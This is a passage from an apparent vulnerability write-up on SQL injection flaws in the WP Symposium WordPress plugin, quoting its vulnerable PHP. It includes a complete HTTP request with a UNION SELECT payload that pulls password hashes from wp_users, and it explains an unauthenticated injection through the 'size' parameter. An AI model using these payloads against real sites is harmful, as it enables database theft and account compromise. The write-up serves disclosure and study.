			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Get group members
if ($_POST['action'] == 'get_group_members') {

	$gid = $_POST['gid'];

	// First clean up the table, making sure there are no user ID = 0 (do across all groups)
	$sql = "DELETE FROM ".$wpdb-&gt;prefix."symposium_group_members WHERE member_id = 0";
	$wpdb-&gt;query($sql);

	// Now get the members
	$sql = "SELECT u.ID, u.display_name, u.user_login FROM ".$wpdb-&gt;prefix."symposium_group_members m
			LEFT JOIN ".$wpdb-&gt;base_prefix."users u ON m.member_id = u.ID
			WHERE group_id = ".$gid." AND m.admin != 'on'
			ORDER BY u.display_name";
	$users = $wpdb-&gt;get_results($sql);

	$html = '';
	if ($users) {
		foreach ($users as $user) {
			$html .= '&lt;div class="user_list_item" id="'.$user-&gt;ID.'" style="clear:both; cursor:pointer; float:left; border:1px solid #aaa; background-color:#ccc;margin-bottom:2px;padding:2px;margin-right:2px;"&gt;';
			$html .= "&lt;img src='".get_option('symposium_images')."/cross.png' style='width:12px; height:12px; float:right; margin-left:3px;' alt='add' /&gt; ";
			$html .= $user-&gt;display_name.' ('.$user-&gt;ID.')';
			$html .= '&lt;/div&gt;';
		}	
	}

	echo $html;
	exit;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b50c3505510077-218">218</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50c3505510077-219">219</div><div class="crayon-num" data-line="crayon-53c98e78b50c3505510077-220">220</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50c3505510077-221">221</div><div class="crayon-num" data-line="crayon-53c98e78b50c3505510077-222">222</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50c3505510077-223">223</div><div class="crayon-num" data-line="crayon-53c98e78b50c3505510077-224">224</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50c3505510077-225">225</div><div class="crayon-num" data-line="crayon-53c98e78b50c3505510077-226">226</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50c3505510077-227">227</div><div class="crayon-num" data-line="crayon-53c98e78b50c3505510077-228">228</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50c3505510077-229">229</div><div class="crayon-num" data-line="crayon-53c98e78b50c3505510077-230">230</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50c3505510077-231">231</div><div class="crayon-num" data-line="crayon-53c98e78b50c3505510077-232">232</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50c3505510077-233">233</div><div class="crayon-num" data-line="crayon-53c98e78b50c3505510077-234">234</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50c3505510077-235">235</div><div class="crayon-num" data-line="crayon-53c98e78b50c3505510077-236">236</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50c3505510077-237">237</div><div class="crayon-num" data-line="crayon-53c98e78b50c3505510077-238">238</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50c3505510077-239">239</div><div class="crayon-num" data-line="crayon-53c98e78b50c3505510077-240">240</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50c3505510077-241">241</div><div class="crayon-num" data-line="crayon-53c98e78b50c3505510077-242">242</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50c3505510077-243">243</div><div class="crayon-num" data-line="crayon-53c98e78b50c3505510077-244">244</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50c3505510077-245">245</div><div class="crayon-num" data-line="crayon-53c98e78b50c3505510077-246">246</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b50c3505510077-218"><span class="crayon-c">// Get group members</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50c3505510077-219"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'get_group_members'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b50c3505510077-220">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50c3505510077-221"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$gid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'gid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50c3505510077-222">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50c3505510077-223"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// First clean up the table, making sure there are no user ID = 0 (do across all groups)</span></div><div class="crayon-line" id="crayon-53c98e78b50c3505510077-224"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"DELETE FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_group_members WHERE member_id = 0"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50c3505510077-225"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50c3505510077-226">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50c3505510077-227"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// Now get the members</span></div><div class="crayon-line" id="crayon-53c98e78b50c3505510077-228"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT u.ID, u.display_name, u.user_login FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_group_members m</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50c3505510077-229"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LEFT JOIN "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users u ON m.member_id = u.ID</span></div><div class="crayon-line" id="crayon-53c98e78b50c3505510077-230"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WHERE group_id = "</span><span class="crayon-sy">.</span><span class="crayon-v">$gid</span><span class="crayon-sy">.</span><span class="crayon-s">" AND m.admin != 'on'</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50c3505510077-231"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ORDER BY u.display_name"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50c3505510077-232"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$users</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_results</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50c3505510077-233">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b50c3505510077-234"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50c3505510077-235"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$users</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c98e78b50c3505510077-236"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">foreach</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$users</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-v">$user</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50c3505510077-237"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;div class="user_list_item" id="'</span><span class="crayon-sy">.</span><span class="crayon-v">$user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">'" style="clear:both; cursor:pointer; float:left; border:1px solid #aaa; background-color:#ccc;margin-bottom:2px;padding:2px;margin-right:2px;"&gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50c3505510077-238"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;img src='"</span><span class="crayon-sy">.</span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_images'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"/cross.png' style='width:12px; height:12px; float:right; margin-left:3px;' alt='add' /&gt; "</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50c3505510077-239"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$user</span><span class="crayon-o">-&gt;</span><span class="crayon-i">display_name</span><span class="crayon-sy">.</span><span class="crayon-s">' ('</span><span class="crayon-sy">.</span><span class="crayon-v">$user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">')'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50c3505510077-240"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;/div&gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50c3505510077-241"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c98e78b50c3505510077-242"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50c3505510077-243">&nbsp;</div><div class="crayon-line" id="crayon-53c98e78b50c3505510077-244"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$html</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50c3505510077-245"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">exit</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50c3505510077-246"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0078 seconds] -->
<p>Because it uses multiple line, we have to do a bit more work than the other ones. We can craft an union select which fits in and uses the rest of the query without a problem like this, and dump a list of usernames and password hashes:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b50d4406286092" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_groups_functions.php HTTP/1.0
Host: 192.168.80.130
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Cookie: wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1347997111%7Cbe07b25720d1c846b47c3dee37e9801d; 
Content-Type: application/x-www-form-urlencoded
Content-Length: 130

action=get_user_list&amp;gid=353234) AND 1=2 UNION SELECT user_pass, 2, 3, 4, 5, 6, 7, 8, 9, display_name, 11 FROM wp_users WHERE (1=1</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b50d4406286092-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50d4406286092-2">2</div><div class="crayon-num" data-line="crayon-53c98e78b50d4406286092-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50d4406286092-4">4</div><div class="crayon-num" data-line="crayon-53c98e78b50d4406286092-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50d4406286092-6">6</div><div class="crayon-num" data-line="crayon-53c98e78b50d4406286092-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50d4406286092-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b50d4406286092-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_groups_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50d4406286092-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c98e78b50d4406286092-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">WOW64</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">rv</span><span class="crayon-o">:</span><span class="crayon-cn">13.0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Gecko</span><span class="crayon-o">/</span><span class="crayon-cn">20100101</span><span class="crayon-h"> </span><span class="crayon-i">Firefox</span><span class="crayon-o">/</span><span class="crayon-cn">13.0.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50d4406286092-4"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1347997111</span><span class="crayon-o">%</span><span class="crayon-cn">7Cbe07b25720d1c846b47c3dee37e9801d</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c98e78b50d4406286092-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50d4406286092-6"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">130</span></div><div class="crayon-line" id="crayon-53c98e78b50d4406286092-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50d4406286092-8"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">get_user_list</span><span class="crayon-o">&amp;</span><span class="crayon-v">gid</span><span class="crayon-o">=</span><span class="crayon-cn">353234</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">AND</span><span class="crayon-h"> </span><span class="crayon-cn">1</span><span class="crayon-o">=</span><span class="crayon-cn">2</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-e">SELECT </span><span class="crayon-i">user_pass</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">3</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">5</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">6</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">7</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">8</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">9</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">display_name</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">11</span><span class="crayon-h"> </span><span class="crayon-e">FROM </span><span class="crayon-e">wp_users </span><span class="crayon-i">WHERE</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">1</span><span class="crayon-o">=</span><span class="crayon-cn">1</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0050 seconds] -->
<p><strong>Analysis of get_album_item.php SQL injection vulnerability</strong></p>
<p>This SQL injection vulnerability is practically as simple as it gets. And it even makes it simple for us in <a href="http://plugins.svn.wordpress.org/wp-symposium/tags/12.09/get_album_item.php">get_album_item.php</a>.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b50de866269537" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&lt;?php
	include_once('../../../wp-config.php');
	global $wpdb;
	$iid = $_REQUEST['iid'];
	$size = $_REQUEST['size'];
	$sql = "SELECT ".$size." FROM ".$wpdb-&gt;base_prefix."symposium_gallery_items WHERE iid = %d";
	$image = $wpdb-&gt;get_var($wpdb-&gt;prepare($sql, $iid));	
	header("Content-type: image/jpeg");
	echo stripslashes($image);
?&gt;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e78b50de866269537-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50de866269537-2">2</div><div class="crayon-num" data-line="crayon-53c98e78b50de866269537-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50de866269537-4">4</div><div class="crayon-num" data-line="crayon-53c98e78b50de866269537-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50de866269537-6">6</div><div class="crayon-num" data-line="crayon-53c98e78b50de866269537-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50de866269537-8">8</div><div class="crayon-num" data-line="crayon-53c98e78b50de866269537-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e78b50de866269537-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e78b50de866269537-1"><span class="crayon-ta">&lt;?php</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50de866269537-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">include_once</span><span class="crayon-sy">(</span><span class="crayon-s">'../../../wp-config.php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50de866269537-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50de866269537-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$iid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'iid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50de866269537-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$size</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'size'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50de866269537-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT "</span><span class="crayon-sy">.</span><span class="crayon-v">$size</span><span class="crayon-sy">.</span><span class="crayon-s">" FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_gallery_items WHERE iid = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50de866269537-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$image</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$iid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50de866269537-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">"Content-type: image/jpeg"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c98e78b50de866269537-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-e">stripslashes</span><span class="crayon-sy">(</span><span class="crayon-v">$image</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e78b50de866269537-10"><span class="crayon-ta">?&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0039 seconds] -->
<p>It reads in 2 variables from $_REQUEST, which can be either GET or POST parameters. That&#8217;s very handy. It then proceeds to stuff the size into the SELECT part of the query using plain concatenation without previous sanitization, and then uses the wordpress prepare method of passing in content to a query safely using a printf syntax, which is safe.</p>
<p>Because we have control over the SELECT part of the query, we can easily select out a single piece of data at a time, which is sufficient to dump the whole database as needed. Here we can pull out a password from the users table, for instance, using a very simple request, no authentication required:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e78b50e9325536592" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
